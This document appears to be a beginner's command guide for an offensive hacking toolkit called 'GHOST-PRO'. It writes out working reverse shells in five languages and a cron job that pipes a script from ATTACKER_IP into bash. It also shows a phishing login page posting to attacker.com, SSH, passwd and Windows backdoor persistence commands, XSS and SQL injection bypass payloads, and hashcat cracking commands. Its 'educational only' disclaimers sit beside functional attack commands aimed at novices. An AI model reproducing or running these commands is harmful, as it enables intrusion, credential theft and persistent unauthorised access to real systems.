COMPLETE COMMANDS GUIDE FOR BEGINNERS

> **⚠️ BEFORE YOU START:** This guide explains EVERY command in the program. You don't need any coding knowledge!

## 📋 WHAT YOU'LL LEARN
- What each command does
- Which commands REALLY work
- Example outputs for each command
- Step-by-step usage

---

## 🎯 MAIN MENU (What you'll see)

When you run the program, you'll see this menu:
[1] DEEP-RECON [6] PRIV-ESCALATE
[2] EXPLOIT-GEN [7] HASH-CRACK
[3] WAF-BYPASS [8] PHISHING-CLONE
[4] BUFFER-OVERFLOW [9] GOD-MODE
[5] REVERSE-SHELL [10] OSINT-ENGINE
[0] EXIT

text

---

## 1️⃣ COMMAND 1: DEEP RECON (Reconnaissance)

**Does it REALLY work?** ✅ YES (This one actually works!)

### What does it do?
- Finds IP address of any website
- Checks if common ports are open
- Reads website headers
- Finds subdomains (like mail.google.com, admin.google.com)

### How to use it:
1. Type `1` and press Enter
2. Type any website (like google.com, github.com)
3. Press Enter
AVCI@GHOST-PRO > 1
[?] Target (domain/IP): google.com

text

### What you'll see:
[*] DNS Lookup...
[+] IP: 142.250.185.78
[*] Port Scanning...
[+] Port 80: OPEN
[+] Port 443: OPEN
[+] Server: gws

text

### Which ports it checks:
`21, 22, 23, 25, 53, 80, 110, 143`

### Try it yourself:
Test with these websites:
- `google.com` (big website)
- `github.com` (coding website)
- Your own website (if you have one)

---

## 2️⃣ COMMAND 2: EXPLOIT GEN (Exploit Generator)

**Does it REALLY work?** ⚠️ PARTIALLY (Creates files but exploits DON'T work)

### What does it do?
- Creates example exploit files
- Shows what exploit code looks like
- **SAFE** - No real hacking happens!

### How to use it:
1. Type `2` and press Enter
2. Choose exploit type: `rce`, `sqli`, `lfi`, `xss`, or `buffer`
3. Type target IP (like 192.168.1.100)
4. Type port number (usually 80)
AVCI@GHOST-PRO > 2
[?] Exploit types: rce, sqli, lfi, xss, buffer
[?] Type: rce
[?] Target: 192.168.1.100
[?] Port (80): 80

text

### What happens next:
Program creates a file named: `exploit_192.168.1.100_80_143022.py`

### Inside the file (example):
```python
# This is just an EXAMPLE!
payloads = [
    "; id",
    "`id`", 
    "$(id)",
    "| id"
]
📁 Where to find the file:
Check the exploits/ folder where you ran the program.

⚠️ IMPORTANT:
These files are for EDUCATION only. They will NOT hack anything!

3️⃣ COMMAND 3: WAF BYPASS (Web Application Firewall Bypass)
Does it REALLY work? ✅ YES (It converts text to different formats)

What does it do?
Takes a normal payload and converts it to different formats that MIGHT bypass security filters.

How to use it:
Type 3 and press Enter

Type any payload (like <script>alert(1)</script>)

See different versions

text
AVCI@GHOST-PRO > 3
[?] Original payload: <script>alert(1)</script>
What you'll see:
URL Encoded:

text
%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E
Uppercase:

text
<SCRIPT>ALERT(1)</SCRIPT>
Lowercase:

text
<script>alert(1)</script>
With spaces changed:

text
<script/**/>alert(1)</script>
With null byte:

text
<script>alert(1)</script>%00
Try different payloads:
<script>alert('XSS')</script>

' OR '1'='1

../../etc/passwd

4️⃣ COMMAND 4: BUFFER OVERFLOW (Pattern Creator)
Does it REALLY work? ✅ YES (Creates text patterns)

What does it do?
Creates unique text patterns used in buffer overflow training.

How to use it:
Type 4 and press Enter

Type pattern length (default is 100)

Copy the pattern

text
AVCI@GHOST-PRO > 4
[?] Pattern length (100): 100
What you'll see:
text
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
What is this used for?
In buffer overflow training, when a program crashes, you can find exactly which part of the pattern caused the crash.

5️⃣ COMMAND 5: REVERSE SHELL (Shell Command Generator)
Does it REALLY work? ⚠️ PARTIALLY (Shows commands but DOESN'T run them)

What does it do?
Shows you different reverse shell commands for different programming languages.

How to use it:
Type 5 and press Enter

Type your IP address (your computer's IP)

Type port number (default 4444)

text
AVCI@GHOST-PRO > 5
[?] LHOST (your IP): 10.0.0.5
[?] LPORT (4444): 4444
What you'll see:
Python:

bash
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.0.0.5",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
Bash:

bash
bash -i >& /dev/tcp/10.0.0.5/4444 0>&1
PHP:

bash
php -r '$sock=fsockopen("10.0.0.5",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
Netcat:

bash
nc -e /bin/sh 10.0.0.5 4444
PowerShell (Windows):

bash
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.5',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
⚠️ IMPORTANT:
These commands are shown for EDUCATIONAL purposes only. They will not run automatically.

6️⃣ COMMAND 6: PRIV ESCALATE (Privilege Escalation Checklist)
Does it REALLY work? ⚠️ PARTIALLY (Shows commands you can try)

What does it do?
Shows you lists of commands that are used to check for privilege escalation opportunities.

How to use it:
Type 6 and press Enter

Choose 1 for Linux or 2 for Windows

text
AVCI@GHOST-PRO > 6
[?] OS (1): 1
Linux Commands (What you'll see):
#	Command	What it checks
1	sudo -l	What sudo commands you can run
2	find / -perm -4000	SUID files
3	find / -perm -2000	SGID files
4	cat /etc/passwd	All users
5	uname -a	System info
6	cat /etc/issue	OS version
7	ps aux | grep root	Root processes
8	netstat -tulpn	Open ports
9	cat /etc/crontab	Scheduled tasks
10	ls -la /etc/cron.*	Cron jobs
11	cat /etc/sudoers	Sudo configuration
12	env	Environment variables
13	id	Your user info
14	hostname	Computer name
15	ip a	Network info
16	cat /proc/version	Kernel version
Windows Commands:
#	Command	What it checks
1	whoami /priv	Your privileges
2	systeminfo	System information
3	net user	All users
4	net localgroup administrators	Admin users
5	dir C:\Users	User folders
6	tasklist	Running processes
7	netstat -ano	Network connections
8	schtasks /query	Scheduled tasks
9	reg query HKLM\...\Run	Startup programs
10	reg query HKCU\...\Run	User startup
11	wmic service	Services
12	driverquery	Drivers
13	set	Environment variables
7️⃣ COMMAND 7: HASH CRACK (Hash Cracking Commands)
Does it REALLY work? ⚠️ PARTIALLY (Identifies hash and shows hashcat commands)

What does it do?
Tells you what type of hash you have (MD5, SHA1, etc.)

Shows you the hashcat command to crack it

DOES NOT crack the hash itself

How to use it:
Type 7 and press Enter

Paste your hash

Choose attack mode

text
AVCI@GHOST-PRO > 7
[?] Hash: 5f4dcc3b5aa765d61d8327deb882cf99
[?] Mode (dict): dict
Hash Types (What the program detects):
Hash Length	Hash Type	Hashcat Mode
32 characters	MD5	0
40 characters	SHA1	100
64 characters	SHA256	1400
128 characters	SHA512	1700
Starts with $2a$ or $2b$	Bcrypt	3200
Starts with $1$	MD5Crypt	500
Attack Modes:
Dictionary Attack (dict):

bash
hashcat -m 0 -a 0 hash.txt rockyou.txt
Uses a wordlist to try common passwords.

Brute Force (brute):

bash
hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a?a
Tries ALL possible combinations (very slow).

Mask Attack (mask):

bash
hashcat -m 0 -a 3 hash.txt ?u?l?l?l?l?d?d
Tries specific patterns (like Capital+lower+numbers).

Hybrid Attack (hybrid):

bash
hashcat -m 0 -a 6 hash.txt rockyou.txt ?a?a?a
Combines dictionary with brute force.

Example Hashes to Try:
Hash	Type
5f4dcc3b5aa765d61d8327deb882cf99	MD5 ("password")
5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8	SHA1 ("password")
$2y$10$N9qo8uLOickgx2ZMRZoMy.Mr/.GmIyZJ5Tq7YQj6Q5Mq9Qz1Qq1Qq	Bcrypt
8️⃣ COMMAND 8: PHISHING CLONE (Phishing Page Creator)
Does it REALLY work? ✅ YES (Creates HTML files)

What does it do?
Creates a fake login page (phishing page) as an HTML file

DOES NOT steal any data

Just shows what a phishing page looks like

How to use it:
Type 8 and press Enter

Type any website URL

Program creates an HTML file

text
AVCI@GHOST-PRO > 8
[?] URL to clone: example.com
What happens:
Creates a file named: phish_example.com_....html

What's inside (example):
html
<html>
<head>
    <title>Security Update Required</title>
    <style>
        .login-box {
            width: 300px;
            padding: 20px;
            border: 1px solid #ccc;
        }
    </style>
</head>
<body>
    <center>
        <h2>🔒 Security Verification Required</h2>
        <div class="login-box">
            <p>Please verify your identity to continue:</p>
            <form action="http://attacker.com/log.php" method="POST">
                <input type="text" name="username" placeholder="Username/Email">
                <input type="password" name="password" placeholder="Password">
                <button type="submit">Verify Identity</button>
            </form>
        </div>
    </center>
</body>
</html>
📁 Where to find it:
Check the phishing/ folder.

⚠️ IMPORTANT:
This is just an EXAMPLE

NO data is actually collected

The form sends nowhere (action is fake)

9️⃣ COMMAND 9: GOD MODE (Persistence Techniques)
Does it REALLY work? ⚠️ PARTIALLY (Shows techniques, DOESN'T apply them)

What does it do?
Shows you different ways attackers maintain access to systems (for educational purposes).

How to use it:
Type 9 and press Enter

Choose 1 for Linux or 2 for Windows

text
AVCI@GHOST-PRO > 9
[?] Choice: 1
Linux Persistence Techniques (What you'll see):
1. Cron Job (Scheduled Task):

bash
echo "*/5 * * * * curl http://ATTACKER_IP/shell.sh | bash" > /tmp/cronjob
crontab /tmp/cronjob
Runs every 5 minutes.

2. SSH Backdoor:

bash
echo 'ssh-rsa AAAAB3... attacker@key' >> ~/.ssh/authorized_keys
Allows login with specific key.

3. SUID Backdoor:

bash
cp /bin/bash /tmp/.bash
chmod 4755 /tmp/.bash
Creates a copy of bash with special permissions.

4. Systemd Service:

bash
cat > /etc/systemd/system/update.service << EOF
[Service]
ExecStart=/bin/bash -c 'while true; do sleep 60; done'
[Install]
WantedBy=multi-user.target
EOF
systemctl enable update.service
Creates a system service.

5. Hidden User:

bash
echo "backdoor:x:0:0:root:/root:/bin/bash" >> /etc/passwd
Adds hidden root user.

Windows Persistence Techniques:
1. Registry Run Key:

batch
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Update /t REG_SZ /d "C:\Windows\System32\backdoor.exe" /f
Runs program at startup.

2. Scheduled Task:

batch
schtasks /create /tn "SystemUpdate" /tr "C:\Windows\System32\backdoor.exe" /sc hourly /mo 1 /ru SYSTEM
Runs every hour.

3. Startup Folder:

batch
copy backdoor.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
Runs when user logs in.

4. Windows Service:

batch
sc create "WindowsUpdate" binPath="C:\Windows\System32\backdoor.exe" start=auto
Creates a system service.

5. WMI Event:

batch
wmic /namespace:\\\\root\\subscription path __EventFilter create Name="Updater", EventNameSpace="root\\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
Runs based on system events.

6. Hidden User:

batch
net user backdoor P@ssw0rd! /add
net localgroup administrators backdoor /add
Adds hidden admin user.

🔟 COMMAND 10: OSINT ENGINE (Open Source Intelligence)
Does it REALLY work? ⚠️ PARTIALLY (Makes educated guesses, doesn't collect real data)

What does it do?
Generates possible email addresses from a name

Checks if social media profiles might exist

Creates a report

How to use it:
Type 10 and press Enter

Type a person's name

Type location (optional)

text
AVCI@GHOST-PRO > 10
[?] Target name: Ahmet Yilmaz
[?] Location (optional): Istanbul
What you'll see:
text
============================================================
OSINT REPORT - Ahmet Yilmaz
============================================================
Generated: 2024-01-15 14:30:22
Target: Ahmet Yilmaz
Location: Istanbul

[EMAILS]
  • ahmet.yilmaz@gmail.com
  • ahmetyilmaz@gmail.com
  • ayilmaz@gmail.com
  • ahmet_yilmaz@gmail.com
  • ahmet.y@hotmail.com
  • ahmety@outlook.com

[SOCIAL MEDIA]
  ✓ LinkedIn (profile might exist)
  ✗ Twitter
  ✓ GitHub (profile might exist)
  ✗ Instagram
  ✗ Facebook

[RECOMMENDATIONS]
1. Try these emails on password reset pages
2. Check LinkedIn for employment info
3. Search GitHub for code contributions
============================================================
📁 Where to find the report:
Check the osint/ folder.

⚠️ IMPORTANT:
This is just SIMULATION

No real data is collected

Email addresses are GENERATED, not found

Social media checks only see if page EXISTS, not if it belongs to the person

0️⃣ COMMAND 0: EXIT
Does it REALLY work? ✅ YES (Exits the program)

How to use it:
text
AVCI@GHOST-PRO > 0
[!] Exiting...
Program closes. Simple as that!

❓ COMMAND: HELP
Does it REALLY work? ✅ YES (Shows this menu)

How to use it:
text
AVCI@GHOST-PRO > help
Shows the main menu again.
